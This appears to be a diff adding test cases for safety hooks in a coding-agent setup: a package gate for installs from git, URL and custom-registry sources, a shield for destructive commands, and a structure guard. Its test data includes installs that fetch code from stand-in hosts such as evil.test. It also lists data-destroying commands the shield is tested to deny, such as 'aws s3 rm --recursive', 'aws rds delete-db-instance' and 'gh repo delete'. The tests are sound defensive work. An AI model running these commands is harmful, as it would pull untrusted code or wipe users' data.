@@ -26,7 +26,8 @@ test('package gate: extracts package names from commands', () => {
 });
 
 test('package gate: download-and-run commands are checked; only the package, not its arguments', () => {
-  const names = (c) => findPackages(c).map((x) => `${x.eco}:${x.name}`);
+  // Registry names only; unverifiable sources (3.49.12) are asserted separately below
+  const names = (c) => findPackages(c).filter((x) => !x.unverifiable).map((x) => `${x.eco}:${x.name}`);
   assert.deepEqual(names('npx -y create-vite@latest app --template react'), ['npm:create-vite']);
   assert.deepEqual(names('npx --yes @scope/tool@1.2 build src'), ['npm:@scope/tool']);
   assert.deepEqual(names('npm exec -- cowsay hi'), ['npm:cowsay']);
@@ -49,9 +50,20 @@ test('package gate: download-and-run commands are checked; only the package, not
     'npx.cmd evilpkg', 'bun x evilpkg', 'pnpm --silent dlx evilpkg', 'pnpm -C . dlx evilpkg', 'npm --silent exec evilpkg',
     'uv --quiet tool run evilpkg', 'uv run --with evilpkg x.py', 'corepack pnpm dlx evilpkg'])
     assert.deepEqual(names(c), [`${c.startsWith('uv') ? 'pypi' : 'npm'}:evilpkg`], c);
+  assert.ok(findPackages('npx --registry https://evil.example evilpkg').some((x) => x.unverifiable), 'a custom registry is asked (3.49.12)');
   assert.deepEqual(names('npm --prefix web install zod'), ['npm:zod']);
   assert.deepEqual(names('npm i zod@npm:evilpkg @types/x@npm:@evil/y@2'), ['npm:evilpkg', 'npm:@evil/y'], 'an npm alias installs its target');
   assert.deepEqual(names('npm i zod@github:evil/x'), [], 'a git spec is not a registry package (like a bare URL)');
+  assert.ok(findPackages('npm i zod@github:evil/x').some((x) => x.unverifiable), 'a git spec is asked (3.49.12)');
+  // The filtered helper must not hide a stray unverifiable entry: only the two commands above carry one
+  const stray = ['npx -y create-vite@latest app --template react', 'npx --yes @scope/tool@1.2 build src', 'npm exec -- cowsay hi',
+    'npx -p typescript@5 -p ts-node tsc --init', 'npx --package=lodash-cli lodash', 'bunx prettier --write .', 'pnpm dlx shadcn add button',
+    'yarn dlx degit x/y', 'uvx ruff check .', 'uvx --from "httpie==3.2" http GET x --with rich,typer', 'uvx --with rich black .',
+    'uv tool run pyright', 'pipx run --spec cowsay==6 cowsay moo', 'npx expo install expo-camera', 'npx ./scripts/x.js',
+    'npx --prefix . evilpkg', 'npx -w a evilpkg', 'FOO=1 npx evilpkg', 'cmd /c npx evilpkg', 'bash -c "npx evilpkg"', 'pnpm -C . dlx evilpkg',
+    'npm --silent exec evilpkg', 'uv run --with evilpkg x.py', 'npm --prefix web install zod', 'npm i zod@npm:evilpkg @types/x@npm:@evil/y@2']
+    .filter((c) => findPackages(c).some((x) => x.unverifiable));
+  assert.deepEqual(stray, [], 'no unverifiable entry for a plain registry command');
   assert.deepEqual(findPackages('npx --weird evilpkg file.txt').map((x) => x.unsure), [true, true], 'after an unknown flag: asked, not denied');
   // Only npx/npm exec/bunx use a local bin first; dlx and a -p package always download
   assert.equal(findPackages('npx tsc')[0].local, true);
@@ -913,4 +925,661 @@ test('3.49.9: structure guard: web-saas, mobile and backend templates carry the 
   const web = deny('web-saas');
   assert.ok(Array.isArray(web) && web.length > 0, 'web-saas has a deny list');
   for (const type of ['mobile', 'backend']) assert.deepEqual(deny(type), web, type);
+});
+
+// ---------- 3.49.12: unverifiable package sources, other ecosystems, dependency-file sources ----------
+
+// Entries the gate cannot check against a registry (git, URL, GitHub shorthand, a custom registry, other ecosystems)
+const unverifiableOf = (list) => (list ?? []).filter((p) => p.unverifiable === true);
+// What describes an entry's source: the contract allows a name or a spec
+const sourceText = (p) => `${p.spec ?? ''} ${p.name ?? ''}`;
+// [command, eco | null, source]: the commands whose findPackages result has no unverifiable entry of that eco describing the source
+const missingUnverifiable = (cases) => cases
+  .filter(([c, eco, source]) => !unverifiableOf(findPackages(c)).some((p) =>
+    (eco ? p.eco === eco : typeof p.eco === 'string' && p.eco.length > 0) && sourceText(p).includes(source)))
+  .map(([c]) => `${c} -> ${JSON.stringify(findPackages(c))}`);
+// Commands that still list an entry the registry would be asked about (not unverifiable)
+const registryEntries = (commands) => commands.map((c) => [c, findPackages(c).filter((p) => p.unverifiable !== true)])
+  .filter(([, r]) => r.length).map(([c, r]) => `${c} -> ${JSON.stringify(r)}`);
+
+const NPM_SOURCES = [
+  ['npm i github:foo/bar', 'npm', 'foo/bar'], ['npm i foo/bar', 'npm', 'foo/bar'], ['npm i git+https://x.com/y.git', 'npm', 'x.com/y.git'],
+  ['npm i git://x/y.git', 'npm', 'x/y.git'], ['npm i https://x.com/y.tgz', 'npm', 'x.com/y.tgz'], ['npm i lodash@github:a/b', 'npm', 'a/b'],
+  ['pnpm add gitlab:a/b', 'npm', 'a/b'], ['npx github:user/repo', 'npm', 'user/repo'],
+];
+
+test('3.49.12: ATTACK package gate: npm git, URL, GitHub-shorthand and hosted-git sources are unverifiable entries, never registry names', () => {
+  assert.deepEqual(missingUnverifiable(NPM_SOURCES), []);
+  assert.deepEqual(registryEntries(NPM_SOURCES.map(([c]) => c)), [], 'foo/bar or lodash must not be looked up (a missing name is denied)');
+});
+
+test('3.49.12: ATTACK package gate: an npm registry override (--registry, --registry=, npm_config_registry) is an unverifiable entry naming the registry', () => {
+  assert.deepEqual(missingUnverifiable([
+    ['npm i --registry http://evil.test x', 'npm', 'evil.test'], ['npm --registry=http://evil.test i x', 'npm', 'evil.test'],
+    ['npm_config_registry=http://evil.test npm i x', 'npm', 'evil.test'], ['pnpm add --registry http://evil.test x', 'npm', 'evil.test'],
+    ['yarn add x --registry http://evil.test', 'npm', 'evil.test'],
+  ]), []);
+});
+
+test('3.49.12: ATTACK package gate: pip/uv/poetry git and URL sources and custom indexes (-i, --index-url, --extra-index-url, -f, --find-links) are unverifiable', () => {
+  const pure = [
+    ['pip install git+https://x.com/y.git', 'pypi', 'x.com/y.git'], ['pip install https://x.com/y.whl', 'pypi', 'x.com/y.whl'],
+    ['uv add git+https://x.com/y.git', 'pypi', 'x.com/y.git'], ['poetry add git+https://x.com/y.git', 'pypi', 'x.com/y.git'],
+  ];
+  assert.deepEqual(missingUnverifiable([
+    ...pure, ['pip install pkg @ git+https://x.com/y.git', 'pypi', 'x.com/y.git'],
+    ['pip install -i http://evil.test x', 'pypi', 'evil.test'], ['pip install --index-url http://evil.test x', 'pypi', 'evil.test'],
+    ['pip install --extra-index-url http://evil.test x', 'pypi', 'evil.test'], ['pip install -f http://evil.test x', 'pypi', 'evil.test'],
+    ['pip install --find-links http://evil.test x', 'pypi', 'evil.test'], ['uv pip install --index-url http://evil.test x', 'pypi', 'evil.test'],
+  ]), []);
+  assert.deepEqual(registryEntries(pure.map(([c]) => c)), [], 'a git or URL source is not looked up on PyPI');
+});
+
+test('3.49.12: package gate: local paths, file: specs, editable installs and requirement files stay free (no entry at all)', () => {
+  for (const c of ['npm i ./lib', 'npm i file:../x', 'npm i ../x.tgz', 'pip install -e .', 'pip install ./dist/x-1.0-py3-none-any.whl', 'pip install -r requirements.txt'])
+    assert.deepEqual(findPackages(c), [], c);
+});
+
+test('3.49.12: ATTACK package gate: cargo, go, gem, bundle and composer installs are unverifiable entries naming the package, also behind cd &&, sudo, VAR= and bash -c', () => {
+  assert.deepEqual(missingUnverifiable([
+    ['cargo add serde', null, 'serde'], ['cargo install ripgrep', null, 'ripgrep'], ['go get github.com/x/y', null, 'github.com/x/y'],
+    ['go install github.com/x/y@latest', null, 'github.com/x/y'], ['gem install rails', null, 'rails'], ['bundle add rails', null, 'rails'],
+    ['composer require monolog/monolog', null, 'monolog/monolog'],
+    ['cd x && cargo add serde', null, 'serde'], ['sudo gem install rails', null, 'rails'], ['FOO=1 go get github.com/x/y', null, 'github.com/x/y'],
+    ['bash -c "composer require monolog/monolog"', null, 'monolog/monolog'],
+  ]), []);
+  assert.deepEqual(registryEntries(['cargo add serde', 'gem install rails', 'composer require monolog/monolog']), [], 'not looked up on npm or PyPI');
+});
+
+test('3.49.12: package gate: cargo/go/bundle/composer builds, local installs and lock installs stay free', () => {
+  for (const c of ['cargo install --path .', 'cargo build', 'go install ./cmd/x', 'go get', 'go build ./...', 'bundle install', 'composer install'])
+    assert.deepEqual(findPackages(c), [], c);
+});
+
+// Fetch that records the call and answers 404 (a registry lookup of an unverifiable source would turn into a deny)
+const FETCH_404 = 'globalThis.fetch = async () => { process.stderr.write("FETCH-CALLED\\n"); return { status: 404, ok: false, json: async () => ({}) }; };';
+const gateReason = (r) => (r.stdout.trim() ? JSON.parse(r.stdout).hookSpecificOutput.permissionDecisionReason : '');
+
+test('3.49.12: ATTACK package gate hook: an install from an unverifiable source is asked (never denied) with the source in the reason, without any registry fetch', () => {
+  for (const [c, source] of [['npm i github:foo/bar', 'foo/bar'], ['npm i foo/bar', 'foo/bar'], ['pip install git+https://x.com/y.git', 'x.com/y.git'],
+    ['cargo add serde', 'serde'], ['go get github.com/x/y', 'github.com/x/y']]) {
+    const { r, decision } = gateRun(c, FETCH_404, 10000);
+    assert.equal(r.error, undefined, `${c}: spawn error ${r.error && r.error.code}`);
+    assert.equal(r.status, 0, `${c}: ${r.stderr.slice(0, 300)}`);
+    assert.equal(decision, 'ask', `${c}: stdout ${r.stdout.slice(0, 300)}`);
+    assert.ok(gateReason(r).includes(source), `${c}: the reason names ${source}: ${gateReason(r)}`);
+    assert.doesNotMatch(r.stderr, /FETCH-CALLED/, `${c}: no registry fetch`);
+  }
+});
+
+// Fetch that records each URL and answers as an old, established PyPI package (status ok on its own)
+const FETCH_OLD_PYPI = 'globalThis.fetch = async (u) => { process.stderr.write("FETCH " + u + "\\n"); return { status: 200, ok: true, json: async () => ({ info: {}, releases: { "1.0": [{ upload_time_iso_8601: "2015-01-01T00:00:00Z" }] } }) }; };';
+
+test('3.49.12: ATTACK package gate hook: pip install --index-url http://evil.test x is asked naming the custom index, and x is still checked against PyPI', () => {
+  const { r, decision } = gateRun('pip install --index-url http://evil.test x', FETCH_OLD_PYPI, 10000);
+  assert.equal(r.error, undefined, `spawn error ${r.error && r.error.code}`);
+  assert.equal(r.status, 0, r.stderr.slice(0, 300));
+  assert.equal(decision, 'ask', `x alone is ok on PyPI; the custom index must still be asked: stdout ${r.stdout.slice(0, 300)}`);
+  assert.ok(gateReason(r).includes('evil.test'), `the reason names the index: ${gateReason(r)}`);
+  assert.match(r.stderr, /FETCH https:\/\/pypi\.org\/pypi\/x\/json/, 'x is still looked up on PyPI');
+});
+
+// { reg: sorted "eco:name" of checked entries, unv: unverifiable entries } of what a dependency-file write adds
+const splitAdded = (r, label) => {
+  assert.ok(Array.isArray(r), `${label}: expected an array, got ${JSON.stringify(r)}`);
+  return { reg: r.filter((p) => p.unverifiable !== true).map((p) => `${p.eco}:${p.name}`).sort(), unv: r.filter((p) => p.unverifiable === true) };
+};
+// Exactly one unverifiable entry of eco, describing the source, and no registry entry
+const onlyUnverifiable = (s, eco, source, label) => {
+  assert.deepEqual(s.reg, [], `${label}: no registry entry`);
+  assert.equal(s.unv.length, 1, `${label}: one unverifiable entry, got ${JSON.stringify(s.unv)}`);
+  assert.equal(s.unv[0].eco, eco, `${label}: eco`);
+  assert.ok(sourceText(s.unv[0]).includes(source), `${label}: describes ${source}: ${JSON.stringify(s.unv[0])}`);
+};
+const GIT_SPECS = [['github:x/y', 'x/y'], ['git+https://x.com/y.git', 'x.com/y.git'], ['https://x.com/y.tgz', 'x.com/y.tgz'], ['user/repo', 'user/repo']];
+
+test('3.49.12: ATTACK package gate: a package.json dependency whose spec becomes or starts as a git, URL or GitHub-shorthand source is unverifiable, not a registry name', async () => {
+  const added = await loadAdded();
+  for (const [spec, source] of GIT_SPECS) {
+    const changed = added('package.json', pkgJson({ dependencies: { zdep: '^1', react: '^18' } }), pkgJson({ dependencies: { zdep: spec, react: '^18' } }));
+    onlyUnverifiable(splitAdded(changed, `changed to ${spec}`), 'npm', source, `existing zdep changed to ${spec}`);
+    const fresh = added('package.json', pkgJson({ dependencies: { react: '^18' } }), pkgJson({ dependencies: { react: '^18' }, devDependencies: { znew: spec } }));
+    onlyUnverifiable(splitAdded(fresh, `new ${spec}`), 'npm', source, `new znew with ${spec}`);
+  }
+});
+
+test('3.49.12: package gate: file:, link: and workspace: specs add nothing; an unchanged git spec already in package.json adds nothing', async () => {
+  const added = await loadAdded();
+  for (const spec of ['file:../x', 'link:../x', 'workspace:*'])
+    assert.deepEqual(added('package.json', pkgJson({ dependencies: { react: '^18' } }), pkgJson({ dependencies: { react: '^18', zlocal: spec } })), [], spec);
+  for (const [spec] of GIT_SPECS)
+    assert.deepEqual(added('package.json', pkgJson({ dependencies: { zdep: spec, react: '^18' } }), pkgJson({ dependencies: { zdep: spec, react: '^19' } })), [], `unchanged ${spec}`);
+});
+
+// Registry ids a package.json change adds; it must add no unverifiable entry
+const overrideIds = (added, before, after, label) => {
+  const s = splitAdded(added('package.json', pkgJson(before), pkgJson(after)), label);
+  assert.deepEqual(s.unv, [], `${label}: no unverifiable entry`);
+  return s.reg;
+};
+
+test('3.49.12: ATTACK package gate: names added in package.json overrides (nested), yarn resolutions (path keys) and pnpm.overrides (selector keys) are checked like dependencies', async () => {
+  const added = await loadAdded();
+  assert.deepEqual(overrideIds(added, {}, { overrides: { zfoo: '1.0.0' } }, 'overrides'), ['npm:zfoo']);
+  assert.deepEqual(overrideIds(added, {}, { overrides: { zfoo: { zbar: '1.0.0' } } }, 'nested overrides'), ['npm:zbar', 'npm:zfoo']);
+  assert.deepEqual(overrideIds(added, {}, { overrides: { zfoo: { '.': '2.0.0', zbar: '1.0.0' } } }, 'the "." key is not a name'), ['npm:zbar', 'npm:zfoo']);
+  assert.deepEqual(overrideIds(added, {}, { resolutions: { '**/zbar': '1.0.0', 'zfoo/zbaz': '2.0.0', '@zs/zq': '3.0.0' } }, 'resolutions: the last package name of a path key'),
+    ['npm:@zs/zq', 'npm:zbar', 'npm:zbaz']);
+  assert.deepEqual(overrideIds(added, {}, { pnpm: { overrides: { 'zfoo@<2>zbar': '1.0.0', 'zbaz>zqux': '2.0.0', zone: '3.0.0' } } }, 'pnpm.overrides: every name of a selector'),
+    ['npm:zbar', 'npm:zbaz', 'npm:zfoo', 'npm:zone', 'npm:zqux']);
+  const kept = { overrides: { zfoo: { zbar: '1.0.0' } }, resolutions: { '**/zbaz': '1.0.0' }, pnpm: { overrides: { 'zq>zr': '1.0.0' } } };
+  assert.deepEqual(overrideIds(added, kept, { overrides: { zfoo: { zbar: '1.0.1' } }, resolutions: { '**/zbaz': '1.0.1' }, pnpm: { overrides: { 'zq>zr': '1.0.1' } } }, 'versions only'), [],
+    'names already overridden add nothing');
+});
+
+test('3.49.12: ATTACK package gate: an npm: alias in overrides adds its target; a git or URL value in overrides, resolutions or pnpm.overrides is unverifiable', async () => {
+  const added = await loadAdded();
+  assert.deepEqual(overrideIds(added, {}, { overrides: { zfoo: 'npm:zevil@1' } }, 'overrides alias'), ['npm:zevil']);
+  assert.deepEqual(overrideIds(added, {}, { resolutions: { '**/zfoo': 'npm:@zevil/x@1' } }, 'resolutions alias'), ['npm:@zevil/x']);
+  for (const [field, label] of [[{ overrides: { zfoo: 'github:a/b' } }, 'overrides'], [{ resolutions: { '**/zfoo': 'github:a/b' } }, 'resolutions'],
+    [{ pnpm: { overrides: { zfoo: 'github:a/b' } } }, 'pnpm.overrides']])
+    onlyUnverifiable(splitAdded(added('package.json', pkgJson({}), pkgJson(field)), label), 'npm', 'a/b', label);
+});
+
+test('3.49.12: ATTACK package gate: a quoted "]" inside the pyproject dependencies array does not end it early', async () => {
+  const added = await loadAdded();
+  const after = '[project]\ndependencies = [\n  "foo; extra == \']\'",\n  "evilpkg",\n]\n';
+  assert.deepEqual(splitAdded(added('pyproject.toml', '', after), 'quoted ]').reg, ['pypi:evilpkg', 'pypi:foo']);
+});
+
+test('3.49.12: ATTACK package gate: pyproject optional-dependencies, dependency-groups and [tool.uv] dev-dependencies are read; include-group is not a name', async () => {
+  const added = await loadAdded();
+  const after = [
+    '[project]', 'name = "app"', 'dependencies = ["zcore"]', '',
+    '[project.optional-dependencies]', 'dev = ["zx", "zy"]', 'docs = [', '  "zdoc>=1",', ']', '',
+    '[dependency-groups]', 'test = ["pytest", "zgrp"]', 'all = [{include-group = "test"}, "zall"]', '',
+    '[tool.uv]', 'dev-dependencies = ["zuv"]', '',
+  ].join('\n');
+  assert.deepEqual(splitAdded(added('pyproject.toml', '', after), 'groups').reg,
+    ['pypi:pytest', 'pypi:zall', 'pypi:zcore', 'pypi:zdoc', 'pypi:zgrp', 'pypi:zuv', 'pypi:zx', 'pypi:zy']);
+  assert.deepEqual(splitAdded(added('pyproject.toml', after, after.replace('"zy"]', '"zy", "znew"]')), 'one more').reg, ['pypi:znew'], 'only the added name');
+});
+
+test('3.49.12: ATTACK package gate: pyproject direct references and poetry git/url tables are unverifiable; a poetry path table adds nothing', async () => {
+  const added = await loadAdded();
+  for (const dep of ['zpkg @ git+https://x/y', 'zpkg @ https://x/y.whl']) {
+    const s = splitAdded(added('pyproject.toml', '', `[project]\ndependencies = ["${dep}"]\n`), dep);
+    assert.notEqual(s.unv.length, 0, `${dep}: unverifiable`);
+    assert.deepEqual(s.unv.filter((p) => p.eco !== 'pypi'), [], `${dep}: eco pypi`);
+    assert.ok(s.unv.some((p) => sourceText(p).includes('x/y')), `${dep}: describes the source: ${JSON.stringify(s.unv)}`);
+  }
+  for (const v of ['{ git = "https://x/y.git" }', '{ url = "https://x/y.whl" }'])
+    onlyUnverifiable(splitAdded(added('pyproject.toml', '', `[tool.poetry.dependencies]\npython = "^3.11"\nzfoo = ${v}\n`), v), 'pypi', 'x/y', `poetry ${v}`);
+  assert.deepEqual(added('pyproject.toml', '', '[tool.poetry.dependencies]\nzfoo = { path = "../x" }\n'), [], 'poetry path table');
+  assert.deepEqual(splitAdded(added('pyproject.toml', '', '[tool.poetry.dependencies]\nzfoo = "^1.0"\n'), 'poetry version'), { reg: ['pypi:zfoo'], unv: [] });
+});
+
+test('3.49.12: ATTACK package gate: added requirements lines with a git or URL source or a custom index are unverifiable; -e ., -r, -c, comments and lines already present add nothing', async () => {
+  const added = await loadAdded();
+  const sources = [['git+https://x/y.git#egg=y', 'x/y.git'], ['-e git+https://x/y.git#egg=y', 'x/y.git'], ['pkg @ https://x/y.whl', 'x/y.whl'],
+    ['--index-url http://evil.test', 'evil.test'], ['-i http://evil.test', 'evil.test'], ['--extra-index-url http://evil.test', 'evil.test'],
+    ['--find-links http://evil.test', 'evil.test'], ['-f http://evil.test', 'evil.test']];
+  for (const [line, source] of sources) {
+    const s = splitAdded(added('requirements.txt', 'requests\n', `requests\n${line}\n`), line);
+    assert.ok(s.unv.some((p) => p.eco === 'pypi' && sourceText(p).includes(source)), `${line}: unverifiable pypi entry describing ${source}: ${JSON.stringify(s.unv)}`);
+  }
+  for (const line of ['-e .', '-r other.txt', '-c constraints.txt', '# git+https://x/y.git#egg=y'])
+    assert.deepEqual(added('requirements.txt', 'requests\n', `requests\n${line}\n`), [], line);
+  for (const [line] of sources)
+    assert.deepEqual(added('requirements-dev.txt', `${line}\nrequests\n`, `requests\n${line}\n# note\n`), [], `already present: ${line}`);
+});
+
+test('3.49.12: ATTACK package gate hook: a Write of package.json adding "x": "github:a/b" is asked, not denied, without a registry fetch', () => {
+  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'pkg-34912-'));
+  try {
+    const r = spawnSync(process.execPath, ['--import', `data:text/javascript,${encodeURIComponent(FETCH_404)}`, path.join(HOOKS, 'package-gate.mjs')], {
+      input: JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Write', cwd: root,
+        tool_input: { file_path: path.join(root, 'package.json'), content: pkgJson({ dependencies: { x: 'github:a/b' } }) } }),
+      encoding: 'utf8', env: { ...process.env, CLAUDE_PROJECT_DIR: root }, timeout: 10000,
+    });
+    assert.equal(r.error, undefined, `spawn error ${r.error && r.error.code}`);
+    assert.equal(r.status, 0, r.stderr.slice(0, 300));
+    assert.notEqual(r.stdout.trim(), '', 'the hook decides');
+    const out = JSON.parse(r.stdout).hookSpecificOutput;
+    assert.equal(out.permissionDecision, 'ask', r.stdout.slice(0, 300));
+    assert.ok(out.permissionDecisionReason.includes('a/b'), `the reason names the source: ${out.permissionDecisionReason}`);
+    assert.doesNotMatch(r.stderr, /FETCH-CALLED/, 'no registry fetch');
+  } finally { fs.rmSync(root, { recursive: true, force: true }); }
+});
+
+// ---------- 3.49.12: cloud deletions, cluster/release/publish commands ----------
+
+const evalDecision = (c) => evaluate(c)?.decision ?? null;
+
+test('3.49.12: ATTACK shield: cloud data deletions (aws s3 rm/rb, rds delete, gcloud sql delete, az group delete, heroku/fly apps destroy, gh repo delete) are denied', () => {
+  assert.deepEqual(shieldMisses(evalDecision, ['aws s3 rm s3://b --recursive', 'aws s3 rb s3://b --force',
+    'aws rds delete-db-instance --db-instance-identifier x', 'aws rds delete-db-cluster --db-cluster-identifier x', 'gcloud sql instances delete x',
+    'az group delete -n x', 'heroku apps:destroy -a x', 'fly apps destroy x', 'flyctl apps destroy x', 'gh repo delete o/r'], ['deny']), []);
+});
+
+test('3.49.12: ATTACK shield: kubectl/helm deletes, railway down, vercel removals, deleting a main branch, publishing and docker system prune -a are asked', () => {
+  assert.deepEqual(shieldMisses(evalDecision, ['kubectl delete pod x', 'kubectl delete -f k8s.yaml', 'helm uninstall x', 'helm delete x', 'railway down',
+    'vercel remove x', 'vc rm x', 'vercel env rm X', 'vercel domains rm example.com', 'git branch -D main', 'git branch --delete --force master',
+    'git branch -d production', 'npm publish', 'npm unpublish x', 'pnpm publish', 'yarn npm publish', 'gh release create v1',
+    'docker system prune -a', 'docker system prune --all'], ['ask']), []);
+});
+
+test('3.49.12: shield: read-only and harmless neighbours (aws s3 ls/cp, kubectl get, helm list, feature branch delete, npm pack, publish --dry-run, release view, plain prune, vercel ls) stay free', () => {
+  assert.deepEqual(shieldMisses(evalDecision, ['aws s3 ls', 'aws s3 cp a s3://b/a', 'kubectl get pods', 'helm list', 'git branch -D feature-x',
+    'npm pack', 'npm publish --dry-run', 'gh release view v1', 'docker system prune', 'vercel env ls', 'vercel ls'], [null]), []);
+});
+
+// ---------- 3.49.12: structure guard on shell-created files, long paths, a broken map ----------
+
+const CLUTTER_MAP = JSON.stringify({ allow: ['src/**', 'a.ts', '*.md', 'sandbox/**'], deny: ['**/*.bak', '**/*-old.*', '**/*.old.*'] });
+// Temp project: a.ts, src/a.ts, sandbox/, an existing.bak; map: the JSON text to write, or null for none
+const clutterProject = (map = CLUTTER_MAP) => {
+  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'clutter-34912-'));
+  fs.writeFileSync(path.join(root, '.kit.json'), JSON.stringify({ lang: 'en' }));
+  fs.mkdirSync(path.join(root, '.claude'), { recursive: true });
+  if (map !== null) fs.writeFileSync(path.join(root, '.claude', 'structure.json'), map);
+  fs.mkdirSync(path.join(root, 'src'));
+  fs.mkdirSync(path.join(root, 'sandbox'));
+  fs.writeFileSync(path.join(root, 'a.ts'), 'export const a = 1;\n');
+  fs.writeFileSync(path.join(root, 'src', 'a.ts'), 'export const a = 1;\n');
+  fs.writeFileSync(path.join(root, 'existing.bak'), 'x\n');
+  return root;
+};
+// Loaded at run time so a missing export fails these tests only
+const loadClutter = async () => {
+  const m = await import('../../.claude/hooks/structure-guard.mjs');
+  assert.equal(typeof m.clutterIssue, 'function', 'structure-guard.mjs exports clutterIssue(command, dir, root)');
+  return m.clutterIssue;
+};
+
+// 3.49.12b: the shell side asks (text parsing can misread a command); the file tools still deny
+test('3.49.12: ATTACK structure guard: a shell command that creates a clutter file (cp, mv, Copy-Item, >, tee, touch, after cd) is asked', async () => {
+  const clutterIssue = await loadClutter();
+  const root = clutterProject();
+  try {
+    const missed = ['cp a.ts a.bak', 'echo x > notes-old.md', 'mv a.ts a-old.ts', 'Copy-Item a.ts a.bak', 'cat a.ts | tee a.bak', 'touch x.old.ts', 'cd src && cp a.ts a.bak']
+      .map((c) => [c, clutterIssue(c, root, root)])
+      .filter(([, s]) => s?.decision !== 'ask' || typeof s.reason !== 'string' || !s.reason.length)
+      .map(([c, s]) => `${c} -> ${JSON.stringify(s)}`);
+    assert.deepEqual(missed, []);
+  } finally { fs.rmSync(root, { recursive: true, force: true }); }
+});
+
+test('3.49.12: structure guard: sandbox, normal names, deletes, reads, an existing destination, a target outside the project, no map and a broken map stay silent on the shell', async () => {
+  const clutterIssue = await loadClutter();
+  const root = clutterProject();
+  const outside = fs.mkdtempSync(path.join(os.tmpdir(), 'clutter-out-'));
+  const none = clutterProject(null), broken = clutterProject('{ "allow": [ broken');
+  try {
+    const out = path.join(outside, 'a.bak').replace(/\\/g, '/');
+    for (const c of ['cp a.ts sandbox/a.bak', 'cp a.ts src/b.ts', 'rm a.bak', 'cat a.bak', 'cp a.ts existing.bak', `cp a.ts ${out}`])
+      assert.equal(clutterIssue(c, root, root), null, c);
+    assert.equal(clutterIssue('cp a.ts a.bak', none, none), null, 'no map');
+    assert.equal(clutterIssue('cp a.ts a.bak', broken, broken), null, 'broken map: the shell side stays silent');
+  } finally { for (const d of [root, outside, none, broken]) fs.rmSync(d, { recursive: true, force: true }); }
+});
+
+test('3.49.12: ATTACK shield hook: cp a.ts a.bak in a project whose map denies *.bak is asked; cp a.ts src/b.ts stays free', () => {
+  const root = clutterProject();
+  try {
+    assert.equal(shield(root, 'cp a.ts a.bak'), 'ask');
+    assert.equal(shield(root, 'cp a.ts src/b.ts'), null);
+  } finally { fs.rmSync(root, { recursive: true, force: true }); }
+});
+
+test('3.49.12: ATTACK structure guard: a path longer than 1024 characters is asked; exactly 1024 is checked normally', async () => {
+  const { readMap, check: checkPath } = await import('../../.claude/hooks/structure-guard.mjs');
+  const map = readMap(path.join(TEMPLATES, 'web-saas'));
+  assert.notEqual(map, null, 'web-saas structure.json loads');
+  const at = (n) => `src/lib/${'a'.repeat(n - 11)}.ts`;
+  assert.equal(at(1025).length, 1025);
+  assert.equal(checkPath(at(1025), map)?.decision, 'ask', '1025 characters');
+  assert.equal(checkPath(at(1024), map), null, 'exactly 1024 characters in src/lib/ is allowed');
+});
+
+test('3.49.12: ATTACK structure guard: check() on a 150 KB path answers ask in under 200 ms (no regex blow-up)', () => {
+  const mod = new URL('../../.claude/hooks/structure-guard.mjs', import.meta.url).href;
+  const code = `const { readMap, check } = await import(${JSON.stringify(mod)});
+const map = readMap(${JSON.stringify(path.join(TEMPLATES, 'web-saas'))});
+const rel = 'src/lib/' + 'a/'.repeat(75000) + 'x.ts'; // inside src/lib/** (allowed): only the length can make it ask
+const t = Date.now(); const s = check(rel, map);
+process.stdout.write(JSON.stringify({ ms: Date.now() - t, decision: s?.decision ?? null }));`;
+  const r = spawnSync(process.execPath, ['--input-type=module', '-e', code], { encoding: 'utf8', timeout: 10000 });
+  assert.equal(r.error, undefined, `check() did not finish in 10000 ms: ${r.error && r.error.code}`);
+  assert.equal(r.status, 0, r.stderr.slice(0, 300));
+  const { ms, decision } = JSON.parse(r.stdout);
+  assert.equal(decision, 'ask');
+  assert.ok(ms < 200, `took ${ms} ms`);
+});
+
+// structure-guard.mjs as Claude Code runs it (Write hook) or as CI runs it (--check)
+const structureRun = (root, args, input) => spawnSync(process.execPath, [path.join(HOOKS, 'structure-guard.mjs'), ...args], {
+  input: input ? JSON.stringify(input) : '', encoding: 'utf8', cwd: root, env: { ...process.env, CLAUDE_PROJECT_DIR: root }, timeout: 20000,
+});
+const newFileWrite = (root) => ({ hook_event_name: 'PreToolUse', tool_name: 'Write', cwd: root, tool_input: { file_path: path.join(root, 'src', 'new.ts'), content: 'x' } });
+
+test('3.49.12: ATTACK structure guard: a map that exists but does not parse asks for a new file and fails --check; a missing map stays silent', () => {
+  const broken = clutterProject('{ "allow": [ broken'), none = clutterProject(null);
+  try {
+    const w = structureRun(broken, [], newFileWrite(broken));
+    assert.equal(w.status, 0, w.stderr);
+    assert.notEqual(w.stdout.trim(), '', 'broken map: the hook decides');
+    assert.equal(JSON.parse(w.stdout).hookSpecificOutput.permissionDecision, 'ask');
+    const c = structureRun(broken, ['--check']);
+    assert.equal(c.status, 1, `broken map: --check exits 1; stdout ${c.stdout} stderr ${c.stderr}`);
+    assert.match(`${c.stdout}${c.stderr}`, /structure\.json/, 'the message names the map file');
+    const nw = structureRun(none, [], newFileWrite(none));
+    assert.equal(nw.status, 0, nw.stderr);
+    assert.equal(nw.stdout, '', 'missing map: silent');
+    assert.equal(structureRun(none, ['--check']).status, 0, 'missing map: --check passes');
+  } finally { for (const d of [broken, none]) fs.rmSync(d, { recursive: true, force: true }); }
+});
+
+// ---------- 3.49.12b: audit of the 3.49.12 code ----------
+
+// Sorted "eco:name" ids of the registry entries of a command / the unverifiable entries of a command
+const regIds = (c) => findPackages(c).filter((p) => p.unverifiable !== true).map((p) => `${p.eco}:${p.name}`).sort();
+const unvOf = (c) => unverifiableOf(findPackages(c));
+
+test('3.49.12b: ATTACK package gate: a tilde version range is a registry name, not a local path (package.json, overrides, npm: alias, npm i)', async () => {
+  const added = await loadAdded();
+  assert.deepEqual(splitAdded(added('package.json', '{}', '{"dependencies":{"reactt":"~1.2.3"}}'), 'dependency ~1.2.3'), { reg: ['npm:reactt'], unv: [] });
+  assert.deepEqual(splitAdded(added('package.json', '{}', '{"overrides":{"reactt":"~1.0.0"}}'), 'override ~1.0.0'), { reg: ['npm:reactt'], unv: [] });
+  assert.deepEqual(splitAdded(added('package.json', '{}', '{"dependencies":{"x":"npm:reactt@~1.0.0"}}'), 'alias to ~1.0.0'), { reg: ['npm:reactt'], unv: [] });
+  assert.deepEqual(regIds('npm i reactt@~1.2.3'), ['npm:reactt']);
+  assert.deepEqual(unvOf('npm i reactt@~1.2.3'), []);
+});
+
